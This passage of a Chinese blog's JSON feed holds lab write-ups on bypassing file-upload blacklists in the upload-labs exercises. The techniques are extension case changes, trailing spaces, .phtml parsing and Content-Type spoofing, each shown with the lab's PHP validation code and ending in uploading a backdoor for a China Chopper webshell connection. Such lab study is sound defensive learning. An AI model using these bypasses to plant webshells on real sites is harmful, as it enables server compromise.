src=\"image-20221003181058551.png\" alt=\"image-20221003181058551\"></p>\n<p>上传成功。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99+%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99+%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/",
            "title": "后缀大小写+空格绕过",
            "date_published": "2022-10-03T08:59:03.000Z",
            "content_html": "<h1 id=\"后缀大小写空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀大小写空格绕过\">#</a> 后缀大小写 + 空格绕过</h1>\n<p>本次讲解后缀校验相关的简单绕过方式，大小写 + 空格绕过</p>\n<p>以 Less-05 为例：</p>\n<h2 id=\"后缀大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀大小写绕过\">#</a> 后缀大小写绕过</h2>\n<p>常规看后台源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到这回直接过滤了 <code>.htaccess</code>  以及 <code>.phtml</code> ，但是比前几次缺少了后缀名全部转小写的操作，因此存在漏洞。</p>\n<p>抓包，送入 Repeater，将后缀名 php 变成 Php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=&quot;backdoor.Php&quot;</span><br></pre></td></tr></table></figure>\n<p>成功上传</p>\n<p><img src=\"image-20221003170308084.png\" alt=\"image-20221003170308084\"></p>\n<p>连接菜刀即可。</p>\n<p>另外，比起黑名单列一大堆，不如使用 <code>白名单过滤</code> 会更加简洁、安全。</p>\n<h2 id=\"后缀加空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加空格绕过\">#</a> 后缀加空格绕过</h2>\n<p>这是一个 Windows 上才会有的特性，Linux 主机没有。</p>\n<p>以 Less-06 为例：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现，跟前面源码的差距是加入了转换为小写，却<strong>忘记添加上对后缀名去空格</strong>。</p>\n<p>同样，抓包修改，文件名为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php &quot;</span></span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003171112732.png\" alt=\"image-20221003171112732\"></p>\n<p>连接菜刀即可。</p>\n<p>在 windows 主机上一定要对后缀名进行 <code>去空格</code> 操作。</p>\n<p>至此，演示完毕。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/phtml%E8%A7%A3%E6%9E%90%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/phtml%E8%A7%A3%E6%9E%90%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "title": "phtml解析审计+绕过",
            "date_published": "2022-10-03T07:05:25.000Z",
            "content_html": "<h1 id=\"phtml解析审计绕过\"><a class=\"markdownIt-Anchor\" href=\"#phtml解析审计绕过\">#</a> phtml 解析审计 + 绕过</h1>\n<p>总结一下对于以下四种文件类型，可能的绕过方式：</p>\n<ul>\n<li><code>.asp</code> :  <code>.asa</code> /  <code>.cer</code> /  <code>.cdx</code></li>\n<li><code>.aspx</code> :  <code>.ashx</code> /  <code>.asmx</code> /  <code>.ascx</code></li>\n<li><code>.php</code> :  <code>.php4</code> /  <code>.php5</code> /  <code>.pthml</code></li>\n<li><code>.jsp</code> :  <code>.jspx</code> /  <code>.jspf</code></li>\n</ul>\n<h2 id=\"pthml解析审计\"><a class=\"markdownIt-Anchor\" href=\"#pthml解析审计\">#</a> pthml 解析审计</h2>\n<p>其中，关于 pthml 可以去看一下 <code>C:\\phpStudyB\\Apache\\conf\\httpd.conf</code>  文件中对于 php 文件类型的解析</p>\n<p>这里 <code>.pthml</code>  后缀的文件可以被后台解析成 <code>.php</code></p>\n<p><img src=\"image-20221003151119447.png\" alt=\"image-20221003151119447\"></p>\n<p>我们以 Pass-03 为例：</p>\n<p>上传 backdoor.php，点击上传后，显示 “<strong>不允许上传.asp, .aspx, .php, .jsp 后缀文件！</strong>”</p>\n<p><img src=\"image-20221003151302968.png\" alt=\"image-20221003151302968\"></p>\n<p>OK，我们看一下源码信息：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.asp&#x27;</span>,<span class=\"string\">&#x27;.aspx&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>,<span class=\"string\">&#x27;.jsp&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                 <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上代码核心干了这么几件事：</p>\n<p>当文件上传路径存在时</p>\n<ul>\n<li>设置黑名单，过滤 <code>.asp</code> ,  <code>.aspx</code> ,  <code>.php</code> ,  <code>.jsp</code></li>\n<li><code>trim()</code>  函数 <code>过滤</code> 上传文件名的 <code>空格</code></li>\n<li><code>deldot()</code>  函数 <code>删除</code> 文件名 <code>最末尾的点</code> 【这是一种绕过方式，后面的博客会介绍到】</li>\n<li><code>strrchr()</code>  函数以 <code>.点</code> 为截断符，获取其右边的字符串，即获取 <code>文件后缀名</code></li>\n<li><code>strtolower()</code>  函数将文件后缀名全部转换成 <code>小写</code></li>\n<li><code>str_ireplace()</code>  函数将去除后缀名当中的 <code>::$DATA</code> ，是一种 Windows 本地文件系统中的文件流，也是一种绕过方式</li>\n<li>再次调用 <code>trim()</code>  函数对后缀名进行 <code>去空格</code></li>\n</ul>\n<p>另外， <code>$img_path</code>  这回使用了 <code>date函数及其格式化</code> ，再使用了 <code>1000-9999的随机数</code> 作为路径名的组成部分。</p>\n<p>date () 函数的第一个必需参数 <em>format</em> 规定了如何格式化日期 / 时间。</p>\n<ul>\n<li>\n<p>可以在字母之间插入其他字符，比如 “/”、&quot;.&quot; 或者 “-”，这样就可以增加附加格式了</p>\n</li>\n<li>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y/m/d\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y.m.d\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>上面代码的输出如下所示：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>2016/10/21</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>2016.10.21</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>2016-10-21</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- 这里列出了一些可用的字符：</span><br><span class=\"line\"></span><br><span class=\"line\">  - Y - 代表年 （四位，如2022）</span><br><span class=\"line\">  - m - 代表月 （01 到 12）</span><br><span class=\"line\">  - d - 代表月中的天 （01 到 31）</span><br><span class=\"line\">- H - 小时，24 小时格式，有前导零 （00 到 23）</span><br><span class=\"line\">  - i - 有前导零的分钟数 （00 到 59）</span><br><span class=\"line\">- s - 秒数，有前导零 （00 到 59）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">## pthml解析绕过</span><br><span class=\"line\"></span><br><span class=\"line\">审计完上述代码，发现对于文件后缀并没有过滤完整，放出了诸如php4、php5、pthml的类型</span><br><span class=\"line\"></span><br><span class=\"line\">抓包，送入Repeater</span><br><span class=\"line\"></span><br><span class=\"line\">### 尝试一：修改为.php4</span><br><span class=\"line\"></span><br><span class=\"line\">修改为</span><br><span class=\"line\"></span><br><span class=\"line\">```php</span><br><span class=\"line\">filename=&quot;backdoor.php4&quot;</span><br></pre></td></tr></table></figure></span></pre></td></tr></table></figure></li>\n</ul>\n<p>上传成功</p>\n<p><img src=\"image-20221003154317074.png\" alt=\"image-20221003154317074\"></p>\n<p>打开页面看看，但并没有解析成 php 执行。</p>\n<p><img src=\"image-20221003154519115.png\" alt=\"image-20221003154519115\"></p>\n<h3 id=\"尝试二修改为php5\"><a class=\"markdownIt-Anchor\" href=\"#尝试二修改为php5\">#</a> 尝试二：修改为.php5</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php5&quot;</span></span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003154701928.png\" alt=\"image-20221003154701928\"></p>\n<p>我们打开网页看看，依旧没有解析成功</p>\n<p><img src=\"image-20221003154727447.png\" alt=\"image-20221003154727447\"></p>\n<h3 id=\"尝试三修改为phtml\"><a class=\"markdownIt-Anchor\" href=\"#尝试三修改为phtml\">#</a> 尝试三：修改为.phtml</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.phtml&quot;</span></span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003154847390.png\" alt=\"image-20221003154847390\"></p>\n<p>打开网页看看，没有原样输出，成功解析。</p>\n<p><img src=\"image-20221003154915997.png\" alt=\"image-20221003154915997\"></p>\n<p>使用菜刀连接：</p>\n<p>①清空缓存库</p>\n<p><img src=\"image-20221003155031987.png\" alt=\"image-20221003155031987\"></p>\n<p>②添加，输入刚刚上传的后门 url，添加参数</p>\n<p><img src=\"image-20221003155130387.png\" alt=\"image-20221003155130387\"></p>\n<p>双击，成功连接。</p>\n<p><img src=\"image-20221003155153049.png\" alt=\"image-20221003155153049\"></p>\n<p>另外，由于解析源码中只罗列了 <code>.php</code> ,  <code>.phtml</code> ，我们可以添加 <code>.txt </code> 或者  <code>.abcd</code>  都可以。</p>\n<p>只要写入了支持解析的类型，重启 Apache 服务，黑客就可以上传对应的后门文件，进行菜刀连接。</p>\n<p>至此，演示完毕。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Content-type%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Content-type%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "title": "Content-type验证审计+绕过",
            "date_published": "2022-10-03T06:44:03.000Z",
            "content_html": "<h1 id=\"content-type验证审计绕过\"><a class=\"markdownIt-Anchor\" href=\"#content-type验证审计绕过\">#</a> content-type 验证审计 + 绕过</h1>\n<p>本篇讲解对于文件上传漏洞中 ——content type 验证审计 + 绕过</p>\n<h2 id=\"content-type验证审计\"><a class=\"markdownIt-Anchor\" href=\"#content-type验证审计\">#</a> content-type 验证审计</h2>\n<p>来到 Pass-02</p>\n<p><img src=\"image-20221003135212262.png\" alt=\"image-20221003135212262\"></p>\n<p>我们点击上传，会提示 “文件类型不正确，请重新上传”</p>\n<p><img src=\"image-20221003135246520.png\" alt=\"image-20221003135246520\"></p>\n<p>不多说，直接开始抓包，看看怎么个情况。</p>\n<p><img src=\"image-20221003135340470.png\" alt=\"image-20221003135340470\"></p>\n<p><strong>媒体类型</strong>（通常称为 <strong>Multipurpose Internet Mail Extensions</strong> 或 <strong>MIME</strong> 类型）是一种标准，用来表示文档、文件或字节流的性质和格式。</p>\n<p>通用结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">type/subtype</span><br></pre></td></tr></table></figure>\n<p>MIME 的组成结构非常简单；由类型与子类型两个字符串中间用 <code>'/'</code>  分隔而组成。不允许空格存在。</p>\n<ul>\n<li><code>type</code>  